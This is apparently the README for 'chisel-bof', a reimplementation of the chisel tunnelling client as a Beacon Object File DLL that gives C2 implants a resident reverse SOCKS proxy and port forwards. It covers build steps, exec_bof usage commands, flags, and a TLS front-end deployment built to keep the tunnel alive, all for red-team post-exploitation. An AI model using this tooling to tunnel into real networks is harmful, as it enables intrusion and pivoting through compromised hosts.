# chisel-bof — a chisel client as a bare BOF-PE DLL

A from-scratch C implementation of the [jpillora/chisel](https://github.com/jpillora/chisel)
client (v1.12.1 wire protocol, `chisel-v3`), compiled to a single x64 DLL with **no CRT, no
Go runtime, and only `ws2_32` + `KERNEL32` imports**. It is loaded and executed like a
Beacon Object File (export `go(args, len)`) but then runs resident, exactly like the real
`chisel client` process.

It interoperates byte-for-byte with the **stock, unmodified chisel server** — proven against
the official 1.12.0 binary, both directly and behind a public TLS front-end (see
[Tested deployment](#tested-deployment-public-tls-front-end)).

Nothing binary is committed here: `build.bat` builds everything from source, including the
crypto static library (hash-verified fetch of Mbed TLS 3.6.7). The prebuilt payload lives on
the **[latest release](https://github.com/ctrgrb/chisel-bof/releases/latest)** — currently
`v1.12.1-bof`, asset `chiselbof.dll`, 21,402,112 bytes,
`sha256 a0fb0ee93ac07e7d5a1a6cedef0f6b856bdaeba8c906fb4fd9fc8fd717138abb` (also in the
`SHA256SUMS.txt` asset). Your own rebuild will **not** hash-match it: the PE timestamp and
the absolute `__FILE__` paths that Mbed TLS's debug build embeds depend on where the
dependency was unpacked. Check the shape instead — imports `ws2_32.dll` (13 winsock names) +
`KERNEL32.dll` (`GetTickCount64`), and zero out-of-image absolute slots from
`tools/pehl2dir.py --audit` (587/587).

## Compile

```
build.bat
```

or with an explicit toolchain:

```
set TOOLCHAIN=C:\path\to\mingw64\bin
build.bat
```

Requirements: Windows x64, mingw-w64 **x86_64** (tested: 8.1.0 msvcrt and winlibs GCC 16.2.0
posix-seh/UCRT), `curl` + `tar` + PowerShell (fetch and hash-verify the crypto dependency),
Python 3 for the tests. On some hardened hosts gcc's `cc1.exe` cannot start standalone:
`GDBWRAP=1` (default when `TOOLCHAIN` is set) runs `gcc`/`ar`/`dlltool` under
`gdb --batch -ex run --args`; `GDBWRAP=0` calls them directly.

| output (all git-ignored) | what it is |
|---|---|
| `build/chiselbof.dll` | the payload — this is what you execute from the beacon |
| `build/pebdrv.exe` | test driver: packs CLI args BOF-style and calls `go()` |
| `deps/MBED.a` | Mbed TLS 3.6.7 static lib, built locally from the pinned tarball |
| `deps/WS2_32nat.a` | winsock import lib, generated from `deps/WS2_32nat.def` by `dlltool` |

`build.bat clean` wipes `build/` and `deps/` and rebuilds from nothing. The script deletes
every intermediate before compiling and checks `build/build.log`, because a stale `.o` or a
DLL still mapped by a running test client otherwise produces a fresh-timestamped binary
running old code; if the output cannot be deleted it stops with `OUTPUT LOCKED`.

Build flags are load-bearing (a `-nostdlib` payload depends on pinned compiler behaviour) and
each one is explained in [docs/build.md](docs/build.md). If the build fails on your box, the
symptom table is [docs/build-problems.md](docs/build-problems.md).

## Use

The DLL exports `go(const char *args, int len)` taking Beacon-packed string arguments
(`z` format, entry point `go`): the server URL, then the remote list. Always `https://` (or
`wss://`) — the transport is TLS, so `ws://`/`http://` is not useful.

Outflank Security Tooling (OST), or any Beacon-family C2 with a BOF-execute primitive:

```
exec_bof_async  zz  https://chisel.example.com  "R:1080:socks"
```

In the OST web UI that is the implant's **Execute BOF** task: artifact `chiselbof.dll`,
entry point `go`, format `zz`, then the URL and the remote.

Two things that look wrong but are expected:

1. **The task never completes.** The proxy is resident; `go()` returns only when it is
   killed. Use the async variant so the beacon thread stays free — the tunnel lives as long
   as the implant does.
2. **`R:` remotes bind on the SERVER, not on the beacon host.** Verify where the server runs:

   ```
   ss -tlnp | grep :1080
   curl -x socks5h://127.0.0.1:1080 -o /dev/null -w '%{http_code}\n' https://example.com
   ```

   With the server started `-v` you want `session#N: Open (… remotes=R:1080:socks)` and
   `tun: Bound proxies`.

### Remote syntax (chisel-compatible)

| feature | syntax | notes |
|---|---|---|
| SOCKS5 on the server | `R:1080:socks` | SOCKS5 hostname CONNECTs are resolved **on the client** (`socks5h` semantics) |
| reverse port forward | `R:<bind>:<host>:<port>` | `R:127.0.0.1:2222:10.0.0.5:22` |
| reverse UDP relay | `R:<bind>:<host>:<port>/udp` | chisel's gob `udpPacket{Src,Payload}` codec, source-peer fidelity (the DNS path) |
| forward remote | `<lport>:<host>:<port>` | local listener on the beacon host |
| auth | `--auth <user>:<pass>` | chisel's own flag: SSH password userauth, checked by the server's `PasswordCallback` — see [Parameters](#parameters-chisel-compatible-flags) |
| keepalive / reconnect | `--keepalive 25s` (default) | both ends ping; each side answers the other's `ping` with `pong`. Any session death redials and re-declares the remotes, with chisel's exponential backoff — see [Parameters](#parameters-chisel-compatible-flags) |

### Parameters (chisel-compatible flags)

Every flag is an ordinary argument in the same list as the URL and the remotes, so the beacon
passes them the same way it passes the URL (`z`-packed strings). Durations use chisel's own
syntax — `500ms`, `30s`, `5m`, `1h` (a bare number means seconds, which `chisel` itself
rejects). Names and defaults match the Go client's flags/env, so a working `chisel client`
command line transfers over unchanged.

**Leading dashes are optional.** `auth`, `-auth` and `--auth` are the same flag (the name after
the dashes must match exactly — `authx` matches nothing). That is not sugar: OST's
`exec_bof <types><args>` is a positional parser that hands any token starting with `-` to its
own option parser, so a dashed flag can never reach the packed argument buffer there —
`unrecognized arguments: --auth`. The form that works in OST is:

```
exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 30s ping-timeout 10s
```

| flag | default | what it does (upstream equivalent) |
|---|---|---|
| `--auth <user>:<pass>` | none | Authenticates to the server. Split at the **first** colon, so the password may contain colons. This is chisel's SSH-level auth: the payload sends `USERAUTH_REQUEST` method `password` (after a `none` probe) and the server checks it in `PasswordCallback` (`server/server.go:authUser`), which is also how `--authfile` per-user address allow-lists are keyed. A rejected credential ends the session and the client retries with backoff — the server logs `Login failed for user "<name>"`. |
| `--keepalive <dur>` | `25s` | How often **this client** sends the SSH global request `ping` and waits for the `pong` reply (`--keepalive 0s` disables our pings; the server's own pings are still answered). Matches `Config.KeepAlive` in the Go client, whose tunnel runs the same keepalive loop on both ends. |
| `--ping-timeout <dur>` | = keepalive | How long to wait for that `pong` before declaring the tunnel dead and redialing (chisel's `PING_TIMEOUT`). This is what detects a *black-holed* path — front-end idle drop, NAT expiry, sleep/wake — where the TCP socket stays open and no byte ever arrives. |
| `--connect-timeout <dur>` | `8s` | Dial deadline (non-blocking `connect` + `select`, confirmed with `SO_ERROR`), applied to the server socket and to every proxied target. |
| `--ws-timeout <dur>` | `45s` | Deadline for the TLS handshake **and** the WebSocket upgrade read (chisel's `WS_TIMEOUT`). |
| `--ssh-timeout <dur>` | `30s` | Deadline for the SSH handshake, userauth and the `config` request (chisel's `SSH_TIMEOUT`). |
| `--min-retry-interval <dur>` | `1s` | Lower bound of the reconnect backoff (`--min-retry-interval`). |
| `--max-retry-interval <dur>` | `5m` | Upper bound of the reconnect backoff (`--max-retry-interval`). |
| `--max-retry-count <n>` | unlimited | Give up (return to the beacon) after `n` failed attempts. `-1` or `0`-or-more semantics as chisel: a negative value means unlimited. Attempts are counted per failed session and **reset once a connection has stayed up for more than 5 s** (chisel's `connected` rule), so a long-lived proxy never accumulates a budget that eventually kills it. |

Backoff is chisel's (`jpillora/backoff`, jitter on, factor 2): the wait for attempt *n* is
uniform in `[min, min·2ⁿ]`, capped at `max-retry-interval`. Measured on this build:
`1000, 1615, 3421, 6191, 9125, 19609, 28835 ms`. A front-end that answers `502/503/421`
because the backend behind it restarted is treated as a session death, so the client backs
off and keeps trying instead of burning a fixed budget.

The payload's own knobs, not chisel's: `--port <p>` (server port, if the URL has none),
`--listen <p>` (socks bind port when the remote spells it without a port; default 1080),
`--tgt <A.B.C.D[:port]>` (destination for SOCKS `CONNECT`s that arrive without an address),
`--ver <string>` (version reported in the `config` request), `--hv <n>` (KEX version-string
shape, for handshake experiments).

The BOF-PE entry unpacks at most **24** length-prefixed argument records (`z`, and `b` too —
records are copied by length, not by NUL), URL + remotes + flags, and a longer list makes `go()`
return 6 **without running anything** — it does not truncate. That matters with the flags above: a
truncated list would drop `auth` or the timeouts while the proxy still appeared to work, which is
exactly the failure this used to have (`SO_RCVTIMEO` measured installed at the 45 s default while
the command line said `3s`, because the flag sat past the old 8-record cap). `tests/packedargs.py`
drives `go()` with hand-built buffers — both header forms, `z` and `b` records, the cap boundary —
and asserts on the return code (1 = flags parsed and the dial budget ran out, 6 = refused, 7 = bad
duration). The twin build (`-DTWIN_MAIN`, command in [docs/build-problems.md](docs/build-problems.md))
takes real `argv`, so it never hits the limit — which is why this bug only ever showed in the DLL.

To *see* what these knobs are doing — the `ping`/`pong` cadence, which phase timed out, which
methods the server would accept — build the console twin or a `DIAG_MARK` build:
[docs/build-problems.md](docs/build-problems.md).

Local smoke test without any C2 (one machine):

```
chisel server --port 8406 --reverse -v --tls-cert cert.pem --tls-key key.pem
build\pebdrv.exe build\chiselbof.dll https://127.0.0.1:8406 "R:1080:socks"
```

`tests/README.md` covers the suites that actually catch regressions (slow consumers, wedged
targets, UDP).

## Tested deployment: public TLS front-end

Real shape of the deployment this client is proven on (names are examples):

```
chiselbof.dll
  -> https://chisel.example.com:443        Azure Front Door terminates TLS
  -> www1.example.com:443                  caddy, site block proxying to the backend
  -> 127.0.0.1:8000                        plain: chisel_1.12.0 server --port 8000 --reverse
```

The chisel server runs **plain HTTP** (`--reverse`, no `--tls`): the TLS terminus is the
front-end, so the client must speak TLS to it and the front-end must forward the WebSocket
upgrade. Check that before touching the client, from any machine:

```
curl -s -o /dev/null -D - --http1.1 \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Sec-WebSocket-Protocol: chisel-v3' \
  https://chisel.example.com/
```

Expect `HTTP/1.1 101 Switching Protocols` with `Sec-WebSocket-Protocol: chisel-v3`. A plain
`GET /` answering `404` is normal — chisel only answers the upgrade.

Every requirement below was first an actual failure against exactly this chain; each passes
against a plain local chisel server, which ignores SNI, certificate chains and the `Host`
header:

- the chain (Let's Encrypt, Front Door, caddy's internal CA) carries NIST **P-384**
  intermediates and is parsed **before** verification can be skipped → the trimmed config
  must include P-256/384/521 in both `MBEDTLS_ECP_DP_*` and `PSA_WANT_ECC_*`;
- SNI must actually be **on the wire** (`MBEDTLS_SSL_SERVER_NAME_INDICATION`), otherwise a
  multi-tenant front-end routes the valid connection to its default site → `404`;
- `Host:` must read `host[:port]` with the port omitted for the scheme default, exactly like
  Go's client — a malformed `Host` gives `421 Misdirected Request` / `SSLMismatchedSNI`;
- the client is pinned to **TLS 1.2**: Front Door answers this trimmed build's TLS 1.3
  ClientHello with fatal alert 40;
- reconnect must survive the front-end answering `502` while the backend is down: caddy and
  Front Door complete the TLS handshake happily and answer `502` themselves, so the client
  treats that as a session death and backs off (chisel's backoff, `--max-retry-count`
  unlimited by default) instead of consuming a hard connect budget.

[docs/afd-front-end.md](docs/afd-front-end.md) has the full write-up, the symptom→cause table
and the measured reconnect numbers.

## How it works

One DLL, one thread, no C runtime. From the outside in:

- **Image.** `DllMainCRTStartup` does nothing but return; the export is `go @1`. Built
  `--dynamicbase`, HIGHLOW, 587 absolute relocation slots — all inside the image, which is
  what makes it safe for a Beacon-style loader (`tools/pehl2dir.py --audit` checks and can
  rewrite them to `DIR64`).
- **Memory.** No heap APIs at all (the only `KERNEL32` import is `GetTickCount64`): one
  20 MiB static arena in `.data` plus a live-block bitmap. It is `.data` rather than `.bss`
  because some loaders commit only `SizeOfRawData`.
- **libc it does not have.** `memcpy/memset/memmove/memcmp/strlen/strcmp/strchr` and the
  whole `printf` family are our own (`src/crypto.c`, `src/mbedfmt.c`) and Mbed TLS's config
  macros are pointed at them, so no libc symbol is ever referenced or defined. Winsock is
  declared in a hand-written import def (`deps/WS2_32nat.def`: 13 names, including
  `setsockopt` for the timeout options) and every call site uses a hand-written extern —
  no SDK headers.
- **TLS.** Mbed TLS 3.6.7, trimmed config, min = max = TLS 1.2, SNI on, certificate chain
  parsed but not verified. Crypto primitives the SSH layer needs (SHA-256, chacha20,
  poly1305, X25519, the OpenSSH KDF) are ours, in `src/crypto.c` / `src/x25519.c`.
- **Transport.** HTTP/1.1 upgrade with `Sec-WebSocket-Protocol: chisel-v3` and no
  authentication header — chisel authenticates inside SSH, not at the upgrade (see
  [Parameters](#parameters-chisel-compatible-flags)), then WebSocket frames with a single
  non-blocking **outbox**: if the socket accepts only part of a frame, the rest is finished by
  the pump instead of blocking it.
- **Tunnel.** Inside the WebSocket sits a real SSH client (`src/sshtun.c`):
  `curve25519-sha256` KEX, `chacha20-poly1305` records, ECDSA/RSA/Ed25519 host keys accepted,
  channel window 2 MiB / max packet 32 KiB exactly matching x/crypto, rekey at 1 GiB served.
- **Chisel control.** After SSH auth the client sends one SSH global request `config` whose
  JSON body is chisel's own `Config` (`Version`, `Remotes[]` with `LocalHost/LocalPort/
  LocalProto/RemoteHost/RemotePort/RemoteProto/Socks/Reverse`); the server logs those remotes
  at `Open`. If the server has `--auth`, the SSH user-auth step carries the `--auth`
  credentials. Keepalive runs in both directions (`ping`/`pong` global requests every
  `--keepalive`), and any session death redials with chisel's backoff. Each proxied stream is
  its own SSH channel; `R:1080:socks` is one channel whose open carries the extra `socks`
  string, and UDP remotes use chisel's gob codec.
- **Lifecycle.** Session loop: connect (deadline `--connect-timeout`) → TLS handshake +
  upgrade (deadline `--ws-timeout`) → SSH handshake, userauth and `config` (deadline
  `--ssh-timeout`) → pump, answering and sending keepalive pings, until death → back off
  (`--min/max-retry-interval`, `--max-retry-count`) → redial and re-declare. Every phase is
  bounded, and the attempt counter resets after any session that stayed up more than 5 s.
  Session teardown/rebuild is capped (`SESSION_MAX 512`) and the arena is reset between
  sessions.
- **Single pump discipline.** That one thread services TLS, WebSocket, pings and every
  channel, so no target write may ever spin: target writes wait for writability with a
  bounded `select()` and give up on that channel alone after ~30 s, and window-stalled
  channels are kept out of the `select()` set. [docs/stability-invariants.md](docs/stability-invariants.md)
  lists the invariants that keep a long session alive under real browsing/RDP traffic — the
  short version is that `curl` a big file proves nothing, and a bug in the flow-control
  accounting kills the whole session with `ssh: remote side wrote too much`.

## Documentation

| file | contents |
|---|---|
| [docs/build.md](docs/build.md) | toolchain pins and why each flag is there, `EXTRA_CFLAGS`, the `MBED.a` build, the config groups that are load-bearing |
| [docs/build-problems.md](docs/build-problems.md) | symptom → cause → fix table for build/link failures and silently-dead payloads |
| [docs/afd-front-end.md](docs/afd-front-end.md) | the Front Door + caddy deployment: traps, how to probe, measured reconnect behaviour |
| [docs/stability-invariants.md](docs/stability-invariants.md) | long-session invariants, what each `tests/` harness catches, reference results |
| [docs/internals.md](docs/internals.md) | wire facts, relocation hygiene, SSH/WS/chisel details learned the hard way |
| [tests/README.md](tests/README.md) | how to run the suites |

## Repository layout

```
build.bat                     one command: deps + payload (and `clean`)
tools/build-deps.bat          fetch + verify + build Mbed TLS, generate the winsock import lib
src/stock.c                   BOF entry (`go()`), winsock/TLS glue, WS framing, outbox
src/sshtun.c                  the tunnel: SSH transport, channel layer, flow control,
                              chisel control, TCP + UDP remotes
src/mbedfmt.c                 snprintf/vsnprintf/printf used by Mbed TLS
src/crypto.c                  SHA-256, SSH KDF, chacha20, poly1305, base64, the libc substitutes
src/x25519.c                  X25519 (Montgomery ladder, RFC 8032)
src/chisel_crypto.h           shared crypto declarations
deps/mbedinc/mbedtls/mbedtls_config.h   trimmed config (load-bearing, see docs/build.md)
deps/chiselbof.def            DLL exports (`go @1`)
deps/WS2_32nat.def            winsock import list (the `.a` is generated from it)
docs/                         build, front-end, stability and internals notes
tools/pebdrv.c                test loader: packs CLI args BOF-style, calls `go()`
tools/pehl2dir.py             HIGHLOW -> DIR64 base-relocation audit/rewriter
tests/                        slow-consumer soak, wedged-target pair, UDP suite
```

Never committed, always generated: `build/`, `deps/MBED.a`, `deps/WS2_32nat.a`,
`deps/mbedtls-*/`, `deps/_mbedtls-*.tar.gz`, `tests/pub/`.

## Third-party and licensing

- **Mbed TLS 3.6.7** (Apache-2.0 / GPL-2.0 dual) — fetched and hash-verified at build time,
  never committed; sources unmodified, compiled with `deps/mbedinc/…/mbedtls_config.h`.
- **jpillora/chisel** (MIT) is the protocol reference; this is original C and contains no Go
  or chisel source.
- This repository's own code: MIT, see `LICENSE`.
